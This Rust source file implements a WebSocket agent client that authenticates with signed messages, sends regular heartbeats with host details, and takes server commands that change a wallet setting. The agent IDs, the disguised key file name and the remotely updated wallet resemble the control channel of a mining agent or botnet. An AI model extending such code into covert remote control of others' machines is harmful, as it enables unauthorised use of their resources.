use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::time;
use url::Url;
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use futures_util::{StreamExt, SinkExt};
use serde::{Deserialize, Serialize};
use crate::common::crypto::{load_or_generate_keys, sign_message};
use crate::utils::paths::get_appdata_dir;

#[derive(Serialize, Deserialize)]
struct Envelope {
    #[serde(rename = "type")]
    msg_type: String,
    payload: String,
    signature: String,
    pub_key: String,
}

#[derive(Serialize)]
struct AuthMessage {
    agent_id: String,
    timestamp: i64,
}

#[derive(Serialize)]
struct HeartbeatMessage {
    agent_id: String,
    hostname: String,
    os: String,
    version: String,
    status: String,
    mesh_health: f32,
}

#[derive(Deserialize)]
struct CommandMessage {
    action: String,
    config: Option<ConfigUpdate>,
}

#[derive(Deserialize)]
struct ConfigUpdate {
    wallet: String,
}

pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);
    
    let hostname = hostname::get()?.to_string_lossy().to_string();
    let agent_id = format!("{}-{}", hostname, &identity.pub_hex[..8]);
    
    let url = Url::parse("ws://127.0.0.1:8080/ws")?;

    loop {
        // Connect
        match connect_async(url.clone()).await {
            Ok((ws_stream, _)) => {
                let (mut write, mut read) = ws_stream.split();
                
                // 1. Send AUTH
                let ts = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() as i64;
                let auth_payload = AuthMessage { agent_id: agent_id.clone(), timestamp: ts };
                let auth_json = serde_json::to_string(&auth_payload)?;
                let sig = sign_message(&identity.keypair, &auth_json);
                
                let env = Envelope {
                    msg_type: "auth".to_string(),
                    payload: auth_json,
                    signature: sig,
                    pub_key: identity.pub_hex.clone(),
                };
                
                write.send(Message::Text(serde_json::to_string(&env)?)).await?;
                
                // 2. Loop
                let mut interval = time::interval(Duration::from_secs(60));
                
                loop {
                    tokio::select! {
                        _ = interval.tick() => {
                            // Send Heartbeat
                            let hb = HeartbeatMessage {
                                agent_id: agent_id.clone(),
                                hostname: hostname.clone(),
                                os: std::env::consts::OS.to_string(),
                                version: "0.5.0".to_string(),
                                status: "Active".to_string(),
                                mesh_health: crate::system::logic::get_mesh_health(),
                            };
                            let hb_json = serde_json::to_string(&hb)?;
                             // Sign Heartbeats too if we want strict security, 
                             // for now assume Auth session valid.
                             // But server checks sig on every message? yes handleMessage does verify. 
                             // So we MUST sign.
                            let sig = sign_message(&identity.keypair, &hb_json);
                             
                            let env = Envelope {
                                msg_type: "heartbeat".to_string(),
                                payload: hb_json,
                                signature: sig,
                                pub_key: identity.pub_hex.clone(),
                            };
                            
                            if let Err(_) = write.send(Message::Text(serde_json::to_string(&env)?)).await {
                                break; // Reconnect
                            }
                        }
                        msg = read.next() => {
                            match msg {
                                Some(Ok(Message::Text(text))) => {
                                    // Parse Command (Server -> Client not signed yet in strict sense, usually encrypted)
                                    // For now just plain JSON or Envelope
                                    // Simplification: Server sends raw JSON command bytes
                                    if let Ok(cmd) = serde_json::from_str::<CommandMessage>(&text) {
                                        if cmd.action == "config" {
                                            if let Some(cfg) = cmd.config {
                                                crate::system::logic::update_wallet_config(&cfg.wallet);
                                            }
                                        }
                                    }
                                }
                                Some(Err(_)) | None => break, // Error or Close
                                _ => {}
                            }
                        }
                    }
                }
            }
            Err(_) => {
                time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
}
